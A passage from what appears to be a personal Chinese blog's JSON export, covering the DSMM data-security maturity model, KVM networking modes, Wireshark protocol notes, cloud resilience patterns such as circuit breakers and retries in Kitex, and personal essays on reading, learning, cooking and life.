机密（G2）：这是高度敏感的信息，如果受到破坏或泄漏，可能会使组织面临财务或法律风险，例如xinyongka信息， PII或个人健康信息（PHI）或商业秘密等。 秘密（G3）：受到破坏或泄漏的数据可能会对运营产生负面影响，例如与合作伙伴和供应商的合同，员工审查等。 内部公开（G4）：非公共披露的信息，例如销售手册，组织结构图，员工信息等。 外部公开（G5）：可以自由公开披露的数据，例如市场营销材料，联系信息，价目表等。\n PA02 数据采集安全管理 https://www.cnblogs.com/autopwn/p/16305886.html\n在采集外部客户、合作伙伴等相关方数据的过程中,组织应明确采集数据的目的和用途,确保满足数据源的真实性、有效性和最少够用等原则要求,并明确数据采集渠道、规范数据格式以及相关的流程 和方式,从而保证数据采集的合规性、正当性、一致性。\nPA03 数据源鉴别及记录 https://www.cnblogs.com/autopwn/p/16313366.html\n对产生数据的数据源进行身份鉴别和记录,防止数据仿冒和数据伪造。\nPA04 数据质量管理 建立组织的数据质量管理体系,保证对数据采集过程中收集/产生的数据的准确性、一致性和完 整性。\n数据传输安全 PA05 数据传输加密 根据组织内部和外部的数据传输要求,采用适当的加密保护措施,保证传输通道、传输节点和传输 数据的安全,防止传输过程中的数据泄漏。\nPA06 网络可用性管理 通过网络基础设施及网络层数据防泄漏设备的备份建设,实现网络的高可用性,从而保证数据传输 过程的稳定性。\n数据存储安全 PA07 存储媒体安全 针对组织内需要对数据存储媒体进行访问和使用的场景,提供有效的技术和管理手段,防止对媒体 的不当使用而可能引发的数据泄漏风险。存储媒体包括终端设备及网络存储。\nPA08 逻辑存储安全 基于组织内部的业务特性和数据存储安全要求,建立针对数据逻辑存储、存储容器等的有效安全 控制。\nPA09 数据备份和恢复 通过执行定期的数据备份和恢复,实现对存储数据的冗余管理,保护数据的可用性。\n数据处理安全 PA10 数据脱敏 根据相关法律法规、标准的要求以及业务需求,给出敏感数据的脱敏需求和规则,对敏感数据进行 脱敏处理,保证数据可用性和安全性的平衡。\nPA11 数据分析安全 通过在数据分析过程采取适当的安全控制措施,防止数据挖掘、分析过程中有价值信息和个人隐私 泄漏的安全风险。\nPA12 数据正当使用 基于国家相关法律法规对数据分析和利用的要求,建立数据使用过程的责任机制、评估机制,保护 国家秘密、商业秘密和个人隐私,防止数据资源被用于不正当目的。\nPA13 数据处理环境安全 为组织内部的数据处理环境建立安全保护机制,提供统一的数据计算、开发平台,确保数据处理的 过程中有完整的安全控制管理和技术支持。\nPA14 数据导入导出安全 通过对数据导入导出过程中对数据的安全性进行管理,防止数据导入导出过程中可能对数据自身 的可用性和完整性构成的危害,降低可能存在的数据泄漏风险。\n数据交换安全 PA15 数据共享安全 通过业务系统、产品对外部组织提供数据时,以及通过合作的方式与合作伙伴交换数据时执行共享 数据的安全风险控制,以降低数据共享场景下的安全风险。\nPA16 数据发布安全 在对外部组织进行数据发布的过程中,通过对发布数据的格式、适用范围、发布者与使用者权利和 义务执行的必要控制,以实现数据发布过程中数据的安全可控与合规。\nPA17 数据接口安全 通过建立组织的对外数据接口的安全管理机制,防范组织数据在接口调用过程中的安全风险。\n数据销毁安全 PA18 数据销毁处置 通过建立针对数据的删除、净化机制,实现对数据的有效销毁,防止因对存储媒体中的数据进行恢 复而导致的数据泄漏风险。\nPA19 存储媒体销毁处置 通过建立对存储媒体安全销毁的规程和技术手段,防止因存储媒体丢失、被窃或未授权的访问而导 致存储媒体中的数据泄漏的安全风险。\n通用安全 PA20 数据安全策略规划 建立适用于组织数据安全风险状况的组织整体的数据安全策略规划,数据安全策略规划的内容应 覆盖数据全生存周期的安全风险。\nPA21组织和人员管理 通过建立组织内部负责数据安全工作的职能部门及岗位,以及对人力资源管理过程中各环节进行 安全管理,防范组织和人员管理过程中存在的数据安全风险。\nPA22 合规管理 跟进组织需符合的法律法规要求,以保证组织业务的发展不会面临个人信息保护、重要数据保护、 跨境数据传输等方面的合规风险。\nPA23 数据资产管理 通过建立针对组织数据资产的有效管理手段,从资产的类型、管理模式方面实现统一的管理要求。\nPA24 数据供应链安全 通过建立组织的数据供应链管理机制,防范组织上下游的数据供应过程中的安全风险。\nPA25 元数据管理 建立组织的元数据管理体系,实现对组织内元数据的集中管理。\nPA26 终端数据安全 基于组织对终端设备层面的数据保护要求,针对组织内部的工作终端采取相应的技术和管理方案。\nPA27 监控与审计 针对数据生存周期各阶段开展安全监控和审计,以保证对数据的访问和操作均得到有效的监控和 审计,以实现对数据生存周期各阶段中可能存在的未授权访问、数据滥用、数据泄漏等安全风险的防控。\nPA28鉴别与访问控制 通过基于组织的数据安全需求和合规性要求建立身份鉴别和数据访问控制机制,防止对数据的未 授权访问风险。\nPA29 需求分析 通过建立针对组织业务的数据安全需求分析体系,分析组织内数据业务的安全需求。\nPA30安全事件应急 建立针对数据的安全事件应急响应体系,对各类安全事件进行及时响应和处置。\n","permalink":"https://kevinerr.github.io/posts/tech/dsmm/","summary":"DSMM:数据安全能力成熟度模型(Data Security Capability Maturity Model) 规定了数据采集安全、数据传输安全、数据存 储安全、数据处理安全、数据交换安全、数据销毁安全、","title":"DSMM"},{"content":"kvm内核虚拟机 简介 虚拟机网络 （1）桥接模式的虚拟机，就像一个在路由器\u0026quot;民政局\u0026quot;那里\u0026quot;上过户口\u0026quot;的成年人，有自己单独的居住地址，虽然和主机住在同一个大院里，但好歹是有户口的人，可以大摇大摆地直接和外面通信。\n（2）NAT模式的虚拟机，纯粹就是一个没上过户口的黑户，路由器\u0026quot;民政局\u0026quot;根本不知道有这么个人，自然也不会主动和它通信。即使虚拟机偶尔要向外面发送点的信件，都得交给主机以主机的名义转发出去，主机还专门请了一位叫做NAT的老大爷来专门负责这些虚拟机的发信、收信事宜。\n（3）仅主机模式的虚拟机，纯粹是一个彻彻底底的黑奴，不仅没有户口、路由器\u0026quot;民政局\u0026quot;不知道这么号人，还被主机关在小黑屋里，连信件也不准往外发。\n其中这个仅主机模式能够保障我们在拔掉网线的情况下继续连接我们的虚拟机，不依靠公网连接，而是依靠物理机和虚拟机的关系连接。在断网的情况下，利用这个模式，我们可以继续连接虚拟机，实现我们的操作。\n","permalink":"https://kevinerr.github.io/posts/tech/kvm/","summary":"kvm内核虚拟机 简介 虚拟机网络 （1）桥接模式的虚拟机，就像一个在路由器\u0026quot;民政局\u0026quot;那里\u0026quot;上过户口\u0026quot;的成","title":"KVM"},{"content":"1\n","permalink":"https://kevinerr.github.io/posts/tech/gopacket/","summary":"1","title":"Gopacket"},{"content":"ARP arp报文段格式 广播 响应 IP ip报文段格式 UDP udp报文段格式 DNS dns报文段格式 ICMP icmp报文段格式 请求 响应 TCP curl -I baidu.com\ntcp报文段格式 3次握手 HTTP http报文段格式 请求 响应 ","permalink":"https://kevinerr.github.io/posts/tech/wireshark/","summary":"ARP arp报文段格式 广播 响应 IP ip报文段格式 UDP udp报文段格式 DNS dns报文段格式 ICMP icmp报文段格式 请求 响应 TCP curl -I baidu.com tcp报文段格式 3次握手 HTTP","title":"WireShark"},{"content":"d断路器模式（接受失败是为了更好的成功） 问题与背景 处理连接到远程服务或资源时可能需要不同时间才能纠正的故障。存在故障是由于不易预料的意外事件造成的，并且可能需要更长的时间来纠正。这些故障的严重程度可以从部分连接丢失到服务完全失败。在这些情况下，应用程序不断重试执行不太可能成功的操作可能毫无意义，相反，应用程序应迅速接受该操作已失败并相应地处理此失败。\n解决方案 1、断路器模式要防止应用程序重复尝试执行可能失败的操作，允许它继续运行，无需等待\n2、断路器模式还使应用程序能够检测故障是否已解决。\n代理 代理应该监视最近发生的失败次数，然后使用此信息来决定是允许操作继续进行，还是立即返回异常。\n代理可以实现为具有以下模仿电气断路器功能的状态的状态机：\nClosed：如果对操作的调用不成功，代理会增加此计数。如果在给定时间段内最近失败的数量超过了指定的阈值，则代理将进入打开状态。此时代理启动一个超时计时器，当该计时器到期时，代理将进入半开状态。\nOpen：来自应用程序的请求立即失败，并向应用程序返回异常。\n半开放：允许来自应用程序的有限数量的请求通过并调用操作。如果这些请求成功，则假定先前导致故障的故障已修复，并且断路器切换到Closed状态（故障计数器被重置）。如果任何请求失败，断路器会假定故障仍然存在，因此它会恢复到打开状态并重新启动超时计时器，以使系统有更多时间从故障中恢复。\n超时计时器的目的是在允许应用程序再次尝试执行操作之前，给系统时间来纠正导致失败的问题。\n半开状态有助于防止正在恢复的服务突然被请求淹没。当服务恢复时，它可能能够支持有限数量的请求，直到恢复完成，但在恢复过程中，大量工作可能会导致服务超时或再次失败。\n该模式是可定制的，并且可以根据可能的故障的性质进行调整。例如，您可以将增加的超时计时器应用于断路器。您最初可以将断路器置于打开状态几秒钟，然后如果故障尚未解决，则将超时时间增加到几分钟，依此类推。在某些情况下，与其让Open状态返回失败并引发异常，不如返回对应用程序有意义的默认值。\n问题和注意事项 何时使用此模式 使用此模式：\n 如果此操作很可能失败，则防止应用程序尝试调用远程服务或访问共享资源。  此模式可能不适合：\n 用于处理对应用程序中本地私有资源的访问，例如内存数据结构。在这种环境中，使用断路器只会增加系统的开销。 代替处理应用程序业务逻辑中的异常。  相关模式和指导 在实现此模式时，以下模式也可能是相关的：\n 重试模式。重试模式是断路器模式的有用补充。它描述了应用程序在尝试连接到服务或网络资源时如何处理预期的临时故障，方法是透明地重试先前失败的操作，并期望故障原因是暂时的。 健康端点监控模式。断路器可能能够通过向服务公开的端点发送请求来测试服务的健康状况。该服务应返回指示其状态的信息。  kitex中采取的策略 Kitex 默认提供了三个基本的熔断触发策略：\n 连续错误数达到阈值 (ConsecutiveTripFunc) 错误数达到阈值 (ThresholdTripFunc) 错误率达到阈值 (RateTripFunc)  熔断器会统计一段时间窗口内的成功，失败和超时，默认窗口大小是 10S；\n重试模式（不达目的不罢休） 解决瞬态故障\n问题与背景 应用程序必须对该环境中可能发生的瞬态故障敏感。此类故障包括与组件和服务的网络连接暂时丢失、服务暂时不可用或服务繁忙时出现的超时。这些故障通常是自我纠正的，如果触发故障的动作在适当的延迟后重复，它很可能是成功的。例如，正在处理大量并发请求的数据库服务可能会实施一种限制策略，在其工作负载减轻之前暂时拒绝任何进一步的请求。尝试访问数据库的应用程序可能无法连接，但如果它在适当的延迟后再次尝试，它可能会成功。\n解决方案 如果应用程序在尝试向远程服务发送请求时检测到失败，它可以使用以下策略来处理失败：\n 如果故障表明失败不是暂时的，或者如果重复失败则不太可能成功（例如，由于提供无效凭据而导致的身份验证失败，无论尝试多少次都不太可能成功），则应用程序应中止操作并报告一个合适的例外。（不再重试） 如果报告的特定故障异常或罕见，则可能是由异常情况引起的，例如网络数据包在传输过程中损坏。在这种情况下，应用程序可以立即重试失败的请求，因为同样的失败不太可能重复，并且请求可能会成功。（立即重试） 如果故障是由更常见的连接或“繁忙”故障之一引起的，则网络或服务可能需要很短的时间来纠正连接问题或清除积压的工作。在重试请求之前，应用程序应该等待一段合适的时间。（随机重试，诸如指数回退之类的计时策略）  问题和注意事项 由实现重试策略的应用程序调用的服务中的操作可能需要是幂等的。\n考虑重试作为事务的一部分的操作将如何影响整个事务的一致性。\n记录所有提示重试的连接失败非常重要，这样可以识别应用程序、服务或资源的潜在问题。\n何时使用此模式 使用此模式：\n 当应用程序在与远程服务交互或访问远程资源时可能会遇到瞬时故障。这些故障预计是短暂的，重复先前失败的请求可能会在后续尝试中成功。  此模式可能不适合：\n 当故障可能持续很长时间时，因为这会影响应用程序的响应能力。应用程序可能只是在浪费时间和资源尝试重复最有可能失败的请求。 用于处理非暂时性故障引起的故障，例如应用程序的业务逻辑错误导致的内部异常。 作为解决系统中可扩展性问题的替代方案。如果应用程序经常遇到“繁忙”故障，这通常表明正在访问的服务或资源应该扩大规模。  kitex中采取的策略 超时重试、Backup Request，建连失败重试（默认）。其中建连失败是网络层面问题，由于请求未发出，框架会默认重试。\n 超时重试：提高服务整体的成功率 Backup Request：减少服务的延迟波动  因为很多的业务请求不具有幂等性，这两类重试不会作为默认策略。\n超时重试 MaxRetryTimes：最大重试次数\nMaxDurationMS：累计最大耗时，包括首次失败请求和重试请求耗时，如果耗时达到了限制的时间则停止后续的重试\nEERThreshold：重试熔断错误率阈值, 方法级别请求错误率超过阈值则停止重试。\nChainStop：链路中止, 默认启用。如果上游请求是重试请求，超时后不会重试。\nDDLStop：链路超时中止，该策略是从链路的超时时间判断是否需要重试。\nBackOff：重试等待策略，默认立即重试（NoneBackOff）。可选：固定时长退避 (FixedBackOff)、随机时长退避 (RandomBackOff)。\nRetrySameNode：框架默认选择其他节点重试，若需要同节点重试，可配置为 true。\nBackup Request RetryDelayMS：Backup Request 的等待时间，若该时间内若请求未返回，会发送新的请求。必须手动配置\n健康端点健康模式 背景与问题 监控 Web 应用程序、中间层和共享服务是一种很好的做法（通常是业务需求），以确保它们可用并正确执行。\n解决方案 通过向应用程序上的端点发送请求来实施健康监控。应用程序应执行必要的检查，并返回其状态指示。\n健康监控检查通常结合两个因素：应用程序或服务为响应对健康验证端点的请求而执行的检查（如果有），以及执行健康验证检查的工具或框架对结果的分析。响应代码指示应用程序的状态，以及它使用的任何组件或服务（可选）。延迟或响应时间检查由监控工具或框架执行。图 1 显示了该模式的实现概览。\n问题和注意事项 何时使用此模式  监控网站和 Web 应用程序以验证可用性。 监控网站和 Web 应用程序以检查是否正确运行。 监控中间层或共享服务以检测和隔离可能中断其他应用程序的故障。 补充应用程序中的现有工具，例如性能计数器和错误处理程序。健康验证检查不会取代应用程序中的日志记录和审计要求。Instrumentation 可以为监控计数器和错误日志以检测故障或其他问题的现有框架提供有价值的信息。但是，如果应用程序不可用，它就无法提供信息。  优先队列模式 背景与问题 对发送到服务的请求进行优先级排序，以便接收和处理具有较高优先级的请求比那些具有较低优先级的请求更快。这种模式在为各个客户端提供不同服务级别保证的应用程序中很有用。\n解决方案 使用支持消息优先级的排队机制\n为每个优先级使用单独的消息队列\n使用优先级排队机制可以提供以下优势：\n 它允许应用程序满足需要优先考虑可用性或性能的业务需求，例如为特定的客户群体提供不同级别的服务。 它可以帮助最大限度地降低运营成本。在单队列方法中，您可以在必要时缩减消费者数量。高优先级的消息仍将首先处理（尽管可能更慢），而低优先级的消息可能会延迟更长的时间。如果你已经实现了多消息队列方法，每个队列有单独的消费者池，你可以减少低优先级队列的消费者池，甚至通过停止所有监听消息的消费者来暂停一些非常低优先级队列的处理。那些队列。 多消息队列方法可以通过根据处理要求对消息进行分区来帮助最大化应用程序的性能和可伸缩性。例如，重要任务可以优先由立即运行的接收器处理，而不太重要的后台任务可以由计划在不太繁忙的时段运行的接收器处理。  问题与注意事项  在解决方案的上下文中定义优先级。例如，“高优先级”可能意味着应该在十秒内处理消息。确定处理高优先级项目的要求，以及必须分配哪些其他资源才能满足这些标准。 决定是否必须先处理所有高优先级项目，然后再处理任何低优先级项目。如果消息正在由单个消费者池处理，则可能需要提供一种机制，该机制可以在更高优先级的消息可用时抢占并暂停正在处理低优先级消息的任务。 在多队列方法中，当使用单个消费者进程池来侦听所有队列而不是为每个队列使用专用消费者池时，消费者必须应用一种算法，以确保它始终在处理来自较低优先级队列的消息之前为来自较高优先级队列的消息提供服务排队。 监控高优先级和低优先级队列的处理速度，以确保这些队列中的消息以预期的速率处理。 如果您需要保证处理低优先级消息，则可能需要实现具有多个消费者池的多消息队列方法。或者，在支持消息优先级的队列中，可能会随着队列消息的老化而动态增加队列消息的优先级。但是，这种方法取决于提供此功能的消息队列。 为每个消息优先级使用单独的队列最适合具有少量明确定义的优先级的系统。 消息优先级可以由系统在逻辑上确定。例如，可以将它们指定为“付费客户”或“非付费客户”，而不是具有明确的高优先级和低优先级消息。根据您的业务模型，您的系统可能会分配更多资源来处理来自付费客户的消息，而不是非付费客户。 检查队列中的消息可能会产生财务和处理成本（一些商业消息传递系统在每次发布或检索消息时以及每次查询队列中的消息时都会收取少量费用）。检查多个队列时，此成本将增加。  何时使用此模式 此模式非常适合以下场景：\n 系统必须处理可能具有不同优先级的多个任务。 应该以不同的优先级为不同的用户或租户提供服务。  竞争消费者模式 背景与问题 允许多个并发消费者处理在同一消息传递通道上接收到的消息。这种模式使系统能够同时处理多个消息以优化吞吐量、提高可伸缩性和可用性以及平衡工作负载。\n在云中运行的应用程序可能会处理大量请求。一种常见的技术不是同步处理每个请求，而是让应用程序通过消息传递系统将它们传递给另一个异步处理它们的服务（消费者服务）。此策略有助于确保在处理请求时不会阻塞应用程序中的业务逻辑。\n解决方案 它启用了一个固有的负载均衡系统\n它提高了可靠性\n它不需要消费者之间或生产者和消费者实例之间的复杂协调。\n它是可扩展的。\n如果消息队列提供事务性读取操作，它可以提高弹性。\n问题与注意事项 留言订购。消费者服务实例接收消息的顺序无法保证，也不一定反映消息的创建顺序。设计系统以确保消息处理是幂等的，因为这将有助于消除对消息处理顺序的任何依赖。\n设计弹性服务。如果系统设计用于检测和重新启动失败的服务实例，则可能需要将服务实例执行的处理实现为幂等操作，以最小化单个消息被多次检索和处理的影响。\n检测毒药信息。格式错误的消息或需要访问不可用资源的任务可能会导致服务实例失败。系统应防止此类消息返回队列，而是捕获这些消息的详细信息并将其存储在其他位置，以便在必要时对其进行分析。\n处理结果。处理消息的服务实例与生成消息的应用程序逻辑完全解耦，它们可能无法直接通信。如果服务实例生成的结果必须传回应用程序逻辑，则此信息必须存储在双方都可以访问的位置，并且系统必须提供一些处理完成时间的指示，以防止应用程序逻辑检索不完整的数据.\n扩展消息系统。在大规模解决方案中，单个消息队列可能会被消息数量所淹没，并成为系统的瓶颈。在这种情况下，请考虑对消息系统进行分区以将消息从特定生产者定向到特定队列，或者使用负载平衡将消息分发到多个消息队列。\n**确保消息系统的可靠性。**需要一个可靠的消息传递系统来保证，一旦应用程序将消息加入队列，它就不会丢失。这对于确保所有消息至少传递一次至关重要。\n何时使用此模式 在以下情况下使用此模式：\n 应用程序的工作负载分为可以异步运行的任务。 任务是独立的，可以并行运行。 工作量变化很大，需要可扩展的解决方案。 该解决方案必须提供高可用性，并且在任务处理失败时必须具有弹性。  在以下情况下，此模式可能不适合：\n  将应用程序工作负载分离成离散的任务并不容易，或者任务之间存在高度依赖关系。\n  任务必须同步执行，应用程序逻辑必须等待任务完成才能继续。\n  任务必须按特定顺序执行。\n一些消息传递系统支持使生产者能够将消息组合在一起并确保它们都由同一个消费者处理的会话。此机制可与优先消息（如果支持）一起使用，以实现一种消息排序形式，将消息按顺序从生产者传递到单个消费者。\n  ","permalink":"https://kevinerr.github.io/posts/read/%E4%BA%91%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","summary":"d断路器模式（接受失败是为了更好的成功） 问题与背景 处理连接到远程服务或资源时可能需要不同时间才能纠正的故障。存在故障是由于不易预料的意外事件","title":"云设计模式"},{"content":"理想的亲密关系\n第一个永远是真诚，我不希望我完全看不透这个人，或者她做了很多事我无法理解，就缺少沟通这种事我觉得是不ok的。\n我希望2个人是在做自己的同时，也为对方改变，但是这种改变是你一定要基于是我在做我自己，在往这个路程走的同时，像一个伴侣更像一个战友，然后在走完这个过程中，我们就是让对方成为了她理想中的更好的那个人\n一定要舒服，不要太刻意的去做很多事，比如说去取悦对方，让对方感到舒服 让自己感到舒服，先让自己舒服下来，让对方进入你舒服的状态，然后让对方也舒服\n真正走出一段感情就是你提到这个人以后，你的心情没有任何的波澜起伏，你可以平静的像叙述一段往事或者站在一个第三者的角度来叙述这个事的时候\n佳人\n全局唯一 ID 生成算法\ngo语言23种设计模式\n我们生活在一个商业社会，可我感觉很多人对此无所感知，毫无认知。\n中美其实非常相似，都崇尚丛林法则，弱肉强食，优胜劣汰。 只是美国经历现代化进程这么多年，不太会表现在明面上。而国内因为还在发展阶段，所以会更加明显一点。\n有阅读习惯的人，上限多高不一定，但是下限一定不会太低。 就算最开始读网络小说也是一个起点，只要从喜好进入，形成习惯了，自己就会去东看西看，着迷其中，阅读范围只会扩大。\n当代青年很多人语言表达能力弱，词汇库贫瘠却没有意识。原因有几个。\n第一，碎片化的阅读。如今多媒体的发达，社交平台上字数的限制，社会节奏的浮躁，导致z世代诞生在一个偏好精悍短小的阅读大环境中，比起耐心看完体系化的书籍、阅读长篇大论的博客，更偏好浮光掠影地看一些片段式文章。并不是说短文不好，短文自有它短平快、构造记忆线索、平铺直叙的优点，但是只沉迷于只言片语对思考并没有那么大的帮助，文字是思想的外化，任何知识，观点，方法如果要说清楚讲透彻是无法依靠三言两语的。\n第二，大众心理学的从众效应。当网络环境上到处是缩略词和网络用语，像是yyds、绝绝子这类给很多人造成理解障碍，失去文字的优美内涵和对词意的承载。只能说经典才能永垂不朽，短暂的东西永远是昙花一现。 有时候从语言表达偏好也可以看出一个人的个性，比如喜欢用很多感叹号的、很不喜欢用标点符号的、标点符号乱用的\u0026hellip;怎么说——你在给别人制造阅读障碍的时候，一定会营造一些观感，错失一些机会。\n大部分事情先人一步，是构建自信心的基础。\n小时候在电视台看过一部超现实主义的短篇动画，2012年作品，名字是《肉娥天》，据说改编自《阅微草堂笔记》的短篇故事《菜人》，讲的是饥荒年间人吃人的故事，全篇无一句台词，色调暗黑阴冷，让人脊背发凉。和看过的《猫汤》风格类似。 动画不只是猎奇cult，也暗喻现实社会。世道艰难，人性扭曲，牛鬼蛇神必然更多。人在极度恶劣的生存环境下，为了保命生存，道德之类的皆可抛诸脑后。 摘取《菜人》原文如下： 草根木皮皆尽，乃以人为粮，官吏弗能禁。 屠者买去，如刲羊豖\n公共媒体就是用来洗脑愚民的。谁给钱就说什么，谁希望宣传什么就说什么。 辨别利益是看透一切事物真相的武器。\n冰心玉壶，丹心汗青，我以我手写我心。 写作是输出，阅读是输入，只有输出＞输入了，输入才更有效，不然也就是和娱乐一样的消遣罢了\n我很喜欢对称的东西，也许也算是基因天性。 对称代表分子有序的排列，而我们讨厌混乱和不确定性。人类觉得对称的脸庞代表健康，便于繁衍后代。诗歌也经常有对称或叫对仗，对称代表美。\n人，一定要有危机感。不论是职业生涯的精进，还是给家人自己买健康保险，炒股时控制风险这一类日常事务。越是怡然自得的时候就越要尽力去看到背后的危险。冰山永远只露出一角。 危机感是我们的祖先留给我们的一种天赋，就像原始人听到丛林深处很远传来的野兽的低吟，就会立马架起防备或逃跑的姿态。这是一种动物的直觉。人也是动物。 也许你想说，现代人已经没有处于这种丛林里的生死存亡的关头了，但是社会从某种程度来说也是一个原始丛林，很多人遵循原始本能和天性行事，这并不是社会达尔文，而是一个事实。 就像刘慈欣所著《三体》的黑暗森林法则：宇宙就是一座黑暗森林，每个文明都是带枪的猎人，像幽灵般潜行于林间，轻轻拨开挡路的树枝，竭力不让脚步发出一点儿声音，连呼吸都必须小心翼翼：他必须小心，因为林中到处都有与他一样潜行的猎人，如果他发现了别的生命，能做的只有一件事：开枪消灭掉。 在这片森林中，他人就是地狱，就是永恒的威胁，任何暴露自己存在的生命都将很快被消灭，这就是宇宙文明的图景，这就是对费米悖论的解释。 文明换成个体同样成立，所以说，在资源是有限的前提下，多个个体的扩张必然造成矛盾和冲突。其实可以看作能量守恒或是零和博弈，一方多了，另一方必然少了；一方所赢，正是另一方所输。 可是很多人并不是不机敏，而是被保护得太好太好，被家长，被学校，被周围的人。让他觉得社会就是他眼中的社会：纯洁无瑕，百花齐放。过于舒适的环境是阻碍个体成长的巨大障碍之一，如果没有危机感，舒适的城堡迟早有一天会崩塌，家长会老，学校会改制，周围的人会一个个远去。天道有常，不为尧存，不为舜亡，人世盛衰不以个人意志为转移，我们难以掌控世界，只能掌控自己。 保持危机感吧，不是制造焦虑，也不是要内卷，而是像蛰伏的动物一样，有嗅到危险即将降临的嗅觉。\n《论工具人》 什么是工具人？我在网上搜到的一个解释是：该词本是一个管理学概念，指被动地接受命令并执行的“被管理者”。作为网络用语则首先用于台湾的一些网络社区（比如PTT）。 现在该词已经被泛化用到各种场景和领域，网游里面的npc是工具人；拼多多帮兄弟砍一刀的是工具人；两性关系帮异性忙的是工具人；给老板当纯纯干活牛马的是工具人\u0026hellip;不一而足，大家带着嘲讽或者自嘲的心态把工具人挂在嘴边，似乎每个人无时无刻不在成为工具人，或是把他人当做工具人。 周围的年轻人一提起这个词，不说中性词还是贬义词，起码不是什么褒义词，看起来它把人异化了，异化成一个个工具，每个人不过是互为螺丝，互为起子，互为工具。不过我有不同角度的看法。 如果从“个人”这个微观角度来看，我们其实可以不成为任何人的工具人，也可以不把任何人当做工具人，只要你剥离和他人和社会的所有关系，比如去到一个孤岛和自然万物为伴，甚至出逃到火星去（那儿甚至可能没有生物），这样从某种程度应该再也不能做工具人了吧？ 可是，如果从“社会”这个宏观角度来看，没有人能成为一座孤岛。现代社会，人的定义某种程度是社会关系的总和。比如你有不同的社会角色，是学生，是职员，是孩子，是父母，在不同的社会场景承担着不同的社会角色。我们每时每刻也都在从社会寻找自己的价值，他人的价值，互相的价值，情绪价值，物质价值，名誉价值。 人、是社会性动物，我们、影响他人，也被他人影响着，每时每刻，此时此刻。\n我非常敬佩能砍价成功的人。 第一，砍价需要一定的博弈能力，不论是朴素的还是理论的、是经验总结还是读书习得，这都说明你能够成功应用并实践博弈论。举个例子，比较常见就是一个物品价格很贵但是你其实很想要，一开始希望降价老板不同意，这时候不能暴露自己的需求感反而要离开假装去别的同质化店子，这时候老板一般会同意降价。 第二，赚钱是非常非常非常不容易的，不要小看一百元、一千元，不要觉得都是小钱，为了小钱不体面，能够砍价成功说明这个人精明（中性词），至少具备一定的口才辩论能力能够让别人让利，因为要知道靠自己赚钱是真的真的很不容易，尤其是高成本一般收益的个体户。当然我是指有和人交互的砍价，最好是线下，当然线上比如咸鱼也算，不是拼多多那种是兄弟就帮我砍一刀的砍价（没有用的补充\n写作 演讲 英语。这是全球信息化时代的key skills。 农业时代，耕种、手工、纺织，吃穿住行，自给自足，日出而作，日落而息。 工业时代，机械、科技、服务，劳动力获得解放，生产效率大大提升。 信息时代，每个个体甚至可以是一个公司，一种产品，学会经营推销自己的理念，通过互联网无限放大自己的声音，去获取global effect。\nopen source和remote enable是我喜欢这行的因素。开源释放想法方案，远程不限物理空间。\n《论炒菜》 炒，相对于蒸、煮，甚至煎来说，几乎是最难的。因为蒸，煮，食物都会被100℃左右的热媒介进行热交换，一个是蒸汽，一个是水。煎，其实可以根据发烟情况，来判断平底锅的温度，因为这时候油层是热媒介。 有人说炒菜是伟大的发明，可以用少量的油脂，达到梅拉德反应需要的180℃，能够达到这个温度的烹饪方法就是烤，煎、炸和炒，也正是因为这个原因，这几个操作容易产生美味大餐。 炒菜相对复杂的原因是，导热媒介是油和水的杂合，加油量需要根据烹调食物的量和食物吸油情况来判断。 炒菜的时候，食物刚刚受热，被破坏的细胞壁就会释放出不少的水，水是炒菜的敌人，因为它马上将油兄弟辛辛苦苦加热到180℃温度，迅速降到100℃，食物在100℃下是不会变色的，香味也出不来，这也是为什么葱姜蒜爆锅出香，要在下菜之前完成。 解决这个问题的方法就是大火，让足够大热量，迅速把食物释放出来的汁水转化为蒸汽，蒸汽在升腾过程中，遇到顶部冷的食物，会释放热量，从而改善整个炒锅内的热量传递。 在锅底接触的部分，食物完成脱水，温度进一步升高达到梅拉德反应的条件，香味才开始飘散出来。 经常炒菜的人，也许会注意到炒菜时候的 咝咝声音，这是水分迅速沸腾，形成蒸汽的声音，这意味着，食物在锅底，已经开始进行脱水演变了，声音会慢慢变小，这时候香味出来，然后就准备出锅吧，否则就是进一步脱水，就变成焦糊啦。\n“成家立业”并不是先后顺序，而是并列进行。 高考结束就代表了单线程人生的结束，并给了人四年时间来适应多线程生活，然后在毕业以后开始正式考验多线程能力 人生时间有限，当被一件事忙到了，务必要想想其他方面是不是缺课太多，做一下或许能有新发现。\n很多人对学习的理解是「懂得很多知识」，其实毫无用处。你这辈子不可能比搜索引擎知道得多，你懂的知识花几十块钱买几本书就能获得，你的表达也不过是借鉴前人的照本宣科。 最惨的是，懂得那么多道理却过不好自己的人生，看着那些不学无术的人骑在自己头上吃香喝辣，看不惯也无可奈何。 学习有什么用？ 不知道怎么谈恋爱，就去学习两性关系。 事业不顺利，就去学习工作相关的技能。 我们生活中遇到的大多数问题，前人早就有丰富的解决方案，学着做就行了。 有些人抱怨生活艰辛，世道艰难，却不懂得通过学习解决问题，运用人类文明的成果来武装自己，结果受苦受累生活还不幸福。 很多技能非常重要，但是学校没教过，我们自己也从来没学过——写作（作文不能算）、表达、演讲、谈判、领导力、决策、团队合作、情绪管理、时间管理、两性关系、亲子教育…… 没有学习过这些，遇到问题不懂得怎么结局，最终只能稀里糊涂的选择不恰当的解决方案：争吵、暴-力、抱怨、逃避等等，结局肯定好不到哪里去。像只无头苍蝇一样乱飞乱撞，你的未来会变得闪闪发光吗？ 努力学习吧，不是为了聚会时的侃侃而谈，不是为了虚无缥缈的优越感。\n年轻人需不需要构建个通识教育框架？ 通识教育其实是个伪命题，这只是针对民众的普及型教育，主要就是告诉你一些常识好让不信朋友圈发的各种养生鸡汤的。 真正的通识教育，其实指的是方法论、底层逻辑、抽象思维。 对科研领域来说，不管是哪个学科专业的专家，使用的试验方法都类似，比如控制变量、交叉验证、因果分析、统计分析等等。 同样，任何的教科书，都必然遵守逻辑严密、用词精准等规则。 这很像是计算机语言，各种各样的软件，都是类似的机器语言编写的。 最好的构建思维体系的方式，就是深入研究某个领域，然后再去深入了解其他领域，你会发现，似乎总有些共同之处。 比如你学经济，然后看历史，你就会发现，原来很多的历史事件背后隐藏的是经济问题；回过头来再看经济内容，你也能捕捉到某些经济政策背后的历史原因。 这些内容的交叉，不仅让你得到更多知识，也能有更严密的思考逻辑。 举个例子，我从来不信任何在「公众场合」推荐股票的人，我并不是研究股票的专家，那我该怎么分辨他说的是不是真的呢？ 1、每个人做事必然会存在利益动机，这么做他一定能到好处。 2、人能得到最常见的好处，无非就是赚钱、名气（用来赚钱）。 3、既然他是研究股票的专家，只需要不断买自己推荐的股票，就能赚到钱了，何必这么辛苦的抛头露面呢？ 